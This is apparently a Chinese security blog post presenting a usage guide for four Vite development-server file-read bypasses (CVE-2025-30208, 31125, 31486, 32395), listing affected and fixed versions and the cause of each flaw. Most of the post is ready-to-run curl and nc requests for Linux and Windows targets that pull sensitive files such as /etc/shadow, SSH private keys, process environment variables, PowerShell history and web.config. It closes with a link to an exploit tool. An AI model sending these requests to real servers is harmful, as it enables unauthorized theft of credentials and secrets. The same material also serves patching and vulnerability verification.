#  Vite漏洞利用指南（文末附工具）  
/root  励行安全   2025-06-09 12:03  
  
## 漏洞利用方法汇总  
### 1. CVE-2025-30208 (尾部分隔符绕过)  
  
**影响版本**  
: < 6.2.3, < 6.1.2, < 6.0.12, < 5.4.15, < 4.5.10  
  
**修复版本**  
: 6.2.3, 6.1.2, 6.0.12, 5.4.15, 4.5.10  
  
**利用原理**  
: 通过在URL中添加?raw??  
或?import&raw??  
查询参数，绕过@fs  
路径限制。这是因为尾部分隔符（如?  
）在多个地方被移除，但在查询字符串正则表达式中未被考虑到。  
  
**Linux系统利用示例**  
:  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 读取任意文件
curl "http://[目标IP]:5173/@fs/etc/passwd?raw??"
curl "http://[目标IP]:5173/@fs/etc/passwd?import&raw??"
curl "http://[目标IP]:5173/@fs/var/log/auth.log?raw??"
curl "http://[目标IP]:5173/@fs/home/[用户名]/.ssh/id_rsa?raw??"

# 验证漏洞是否存在
curl "http://[目标IP]:5173/@fs/etc/passwd"  # 应返回403错误
curl "http://[目标IP]:5173/@fs/etc/passwd?raw??"  # 如果返回文件内容，则存在漏洞
```  
  
**Windows系统利用示例**  
:  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 读取任意文件
curl "http://[目标IP]:5173/@fs/C:/Windows/win.ini?raw??"
curl "http://[目标IP]:5173/@fs/C:/Windows/system32/drivers/etc/hosts?raw??"
curl "http://[目标IP]:5173/@fs/C:/Users/Administrator/Desktop/credentials.txt?raw??"
curl "http://[目标IP]:5173/@fs/C:/inetpub/wwwroot/web.config?raw??"

# 验证漏洞是否存在
curl "http://[目标IP]:5173/@fs/C:/Windows/win.ini"  # 应返回403错误
curl "http://[目标IP]:5173/@fs/C:/Windows/win.ini?raw??"  # 如果返回文件内容，则存在漏洞
```  
### 2. CVE-2025-31125 (特定导入方法绕过)  
  
**影响版本**  
: 与CVE-2025-30208相同  
  
**修复版本**  
: 与CVE-2025-30208相同  
  
**利用原理**  
: 通过使用特定的导入方法，如?inline&import  
或?raw?import  
，绕过server.fs.deny  
配置。  
  
**Linux系统利用示例**  
:  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 读取任意文件
curl "http://[目标IP]:5173/@fs/etc/passwd?inline&import"
curl "http://[目标IP]:5173/@fs/etc/passwd?raw?import"
curl "http://[目标IP]:5173/@fs/etc/shadow?inline&import"
curl "http://[目标IP]:5173/@fs/proc/self/environ?inline&import"

# 验证漏洞是否存在
curl "http://[目标IP]:5173/@fs/etc/passwd"  # 应返回403错误
curl "http://[目标IP]:5173/@fs/etc/passwd?inline&import"  # 如果返回文件内容，则存在漏洞
```  
  
**Windows系统利用示例**  
:  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 读取任意文件
curl "http://[目标IP]:5173/@fs/C:/Windows/win.ini?inline&import"
curl "http://[目标IP]:5173/@fs/C:/Windows/system32/drivers/etc/hosts?inline&import"
curl "http://[目标IP]:5173/@fs/C:/Program Files/MySQL/MySQL Server 8.0/my.ini?inline&import"
curl "http://[目标IP]:5173/@fs/C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt?inline&import"

# 验证漏洞是否存在
curl "http://[目标IP]:5173/@fs/C:/Windows/win.ini"  # 应返回403错误
curl "http://[目标IP]:5173/@fs/C:/Windows/win.ini?inline&import"  # 如果返回文件内容，则存在漏洞
```  
### 3. CVE-2025-31486 (SVG和相对路径绕过)  
  
**影响版本**  
: < 6.2.5, < 6.1.4, < 6.0.14, < 5.4.17, < 4.5.12  
  
**修复版本**  
: 6.2.5, 6.1.4, 6.0.14, 5.4.17, 4.5.12  
  
**利用原理**  
:  
1. **SVG绕过**  
: 通过添加?.svg?.wasm?init  
或使用sec-fetch-dest: script  
头，绕过对.svg  
文件的限制检查  
  
1. **相对路径绕过**  
: 利用ID规范化前的检查漏洞，使用相对路径（如../../  
）绕过限制  
  
**Linux系统利用示例**  
:  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# SVG绕过方法
curl "http://[目标IP]:5173/etc/passwd?.svg?.wasm?init"
curl -H "sec-fetch-dest: script" "http://[目标IP]:5173/etc/passwd?.svg"
curl "http://[目标IP]:5173/etc/nginx/nginx.conf?.svg?.wasm?init"
curl "http://[目标IP]:5173/var/www/html/config.php?.svg?.wasm?init"

# 相对路径绕过方法
curl "http://[目标IP]:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?raw"
curl "http://[目标IP]:5173/@fs/x/x/x/vite-project/?/../../../../../etc/shadow?import&?raw"
curl "http://[目标IP]:5173/@fs/x/x/x/vite-project/?/../../../../../var/log/auth.log?import&?raw"

# 验证漏洞是否存在
curl "http://[目标IP]:5173/etc/passwd"  # 应返回404错误
curl "http://[目标IP]:5173/etc/passwd?.svg?.wasm?init"  # 如果返回文件内容，则存在漏洞
```  
  
**Windows系统利用示例**  
:  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# SVG绕过方法
curl "http://[目标IP]:5173/C:/Windows/win.ini?.svg?.wasm?init"
curl -H "sec-fetch-dest: script" "http://[目标IP]:5173/C:/Windows/win.ini?.svg"
curl "http://[目标IP]:5173/C:/inetpub/wwwroot/web.config?.svg?.wasm?init"
curl "http://[目标IP]:5173/C:/Windows/Panther/Unattend.xml?.svg?.wasm?init"

# 相对路径绕过方法
curl "http://[目标IP]:5173/@fs/x/x/x/vite-project/?/../../../../../C:/Windows/win.ini?import&?raw"
curl "http://[目标IP]:5173/@fs/x/x/x/vite-project/?/../../../../../C:/Windows/system32/drivers/etc/hosts?import&?raw"
curl "http://[目标IP]:5173/@fs/x/x/x/vite-project/?/../../../../../C:/Users/Administrator/Desktop/credentials.txt?import&?raw"

# 验证漏洞是否存在
curl "http://[目标IP]:5173/C:/Windows/win.ini"  # 应返回404错误
curl "http://[目标IP]:5173/C:/Windows/win.ini?.svg?.wasm?init"  # 如果返回文件内容，则存在漏洞
```  
  
**注意**  
: SVG绕过仅在文件小于build.assetsInlineLimit  
（默认4kB）且使用Vite 6.0+时有效。  
### 4. CVE-2025-32395 (无效请求目标绕过)  
  
**影响版本**  
: < 6.2.6, < 6.1.5, < 6.0.15, < 5.4.18, < 4.5.13  
  
**修复版本**  
: 6.2.6, 6.1.5, 6.0.15, 5.4.18, 4.5.13  
  
**利用原理**  
: 利用HTTP 1.1规范中不允许在request-target  
中使用#  
字符的特性。在Node和Bun运行时中，这些请求不会被内部拒绝，http.IncomingMessage.url  
包含#  
，而Vite在检查server.fs.deny  
时假设req.url  
不会包含#  
。  
  
**Linux系统利用示例**  
:  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 使用curl的--request-target选项
curl --request-target "/@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../etc/passwd" "http://[目标IP]:5173"
curl --request-target "/@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../etc/shadow" "http://[目标IP]:5173"
curl --request-target "/@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../var/www/html/wp-config.php" "http://[目标IP]:5173"

# 或使用原始HTTP请求
echo -e "GET /@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../etc/passwd HTTP/1.1\r\nHost: [目标IP]:5173\r\nConnection: close\r\n\r\n" | nc [目标IP] 5173
echo -e "GET /@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../etc/shadow HTTP/1.1\r\nHost: [目标IP]:5173\r\nConnection: close\r\n\r\n" | nc [目标IP] 5173

# 验证漏洞是否存在
curl "http://[目标IP]:5173/@fs/etc/passwd"  # 应返回403错误
curl --request-target "/@fs/x/#/../../../../../etc/passwd" "http://[目标IP]:5173"  # 如果返回文件内容，则存在漏洞
```  
  
**Windows系统利用示例**  
:  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 使用curl的--request-target选项
curl --request-target "/@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../C:/Windows/win.ini" "http://[目标IP]:5173"
curl --request-target "/@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../C:/Windows/system32/drivers/etc/hosts" "http://[目标IP]:5173"
curl --request-target "/@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../C:/inetpub/wwwroot/web.config" "http://[目标IP]:5173"
curl --request-target "/@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../C:/Program Files/Microsoft SQL Server/MSSQL15.SQLEXPRESS/MSSQL/DATA/master.mdf" "http://[目标IP]:5173"

# 或使用原始HTTP请求
echo -e "GET /@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../C:/Windows/win.ini HTTP/1.1\r\nHost: [目标IP]:5173\r\nConnection: close\r\n\r\n" | nc [目标IP] 5173
echo -e "GET /@fs/Users/[用户名]/Desktop/vite-project/#/../../../../../C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt HTTP/1.1\r\nHost: [目标IP]:5173\r\nConnection: close\r\n\r\n" | nc [目标IP] 5173

# 验证漏洞是否存在
curl "http://[目标IP]:5173/@fs/C:/Windows/win.ini"  # 应返回403错误
curl --request-target "/@fs/x/#/../../../../../C:/Windows/win.ini" "http://[目标IP]:5173"  # 如果返回文件内容，则存在漏洞
```  
  
**注意**  
: 此漏洞仅影响在Node或Bun（非Deno）环境中运行的Vite服务器。  
  
工具链接：  
https://github.com/nkuty/CVE-2025-30208-31125-31486-32395  
  
